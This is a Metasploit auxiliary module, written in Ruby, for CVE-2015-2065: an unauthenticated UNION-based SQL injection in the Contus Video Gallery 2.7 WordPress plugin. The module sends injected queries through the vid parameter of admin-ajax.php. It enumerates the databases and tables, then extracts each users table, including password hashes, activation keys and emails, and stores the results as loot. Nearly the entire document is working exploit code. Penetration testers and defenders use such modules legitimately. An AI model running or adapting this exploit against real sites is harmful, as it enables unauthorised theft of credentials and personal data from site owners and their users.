##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'
require 'json'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Contus Video Gallery for Wordpress Unauthenticated SQL Injection User Enumeration",
      'Description'    => %q{
      This module exploits a UNION-based unauthenticated SQL injection within version 2.7
      of Contus Video Gallery in order to enumerate the users table.
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
        ],
      'References'     =>
        [
          ['CVE', '2015-2065']
        ],
      'Platform'       => ['win', 'linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 12 2015"))

      register_options(
      [
        OptString.new('TARGETURI', [ true, 'Relative URI of Wordpress installation', '/'])
      ], self.class)
  end

  def run
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    get_dbs = "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- "

    res = send_injected_request(get_dbs)

    if res.nil? or res.body.nil?
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    matches = res.body.scan(/#{left_marker}(.*)#{right_marker}/)

    dbs = []
    matches.uniq.each do |match|
      dbs << match[0]
    end

    dbs.delete("performance_schema")
    dbs.delete("information_schema")
    dbs.delete("mysql")

    users = []
    dbs.each do |db|
      get_tables = "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})-- "
      res = send_injected_request(get_tables)

      if res.nil? or res.body.nil?
        fail_with(Failure::Unknown, "Server did not respond in an expected way")
      end

      matches = res.body.scan(/#{left_marker}(.*)#{right_marker}/)

      tables = []
      matches.uniq.each do |match|
        tables << match[0] if match[0] =~ /users$/
      end

      tables.each do |table|
        get_users = "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(ID AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(display_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(user_activation_key AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(user_email AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(user_login AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(user_nicename AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(user_pass AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(user_registered AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(user_status AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]},IFNULL(CAST(user_url AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM #{db}.#{table}-- "
        res = send_injected_request(get_users)

        if res.nil? or res.body.nil?
          fail_with(Failure::Unknown, "Server did not respond in an expected way")
        end

        matches = res.body.scan(/#{left_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{right_marker}(.*?)#{left_marker}/)


        matches.uniq.each do |match|
          user = {}
          user ['id'] = match[0]
          user ['display_name'] = match[1]
          user ['user_activation_key'] = match[2]
          user ['user_email'] = match[3]
          user ['user_login'] = match[4]
          user ['user_nicename'] = match[5]
          user ['user_pass'] = match[6]
          user ['user_registered'] = match[7]
          user ['user_status'] = match[8]
          user ['user_url'] = match[9]

          users << user
        end
      end
    end
    path = store_loot("wordpress.file", "application/json", datastore['RHOST'], users.to_json, 'wp_contus_video_gallery.users')

    print_good("Users stored in file: #{path}")
  end

  def send_injected_request(payload)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' => {
        'action' => 'rss',
        'type' => 'video',
        'vid' => '-1 ' + payload
      }
    })
  end

end

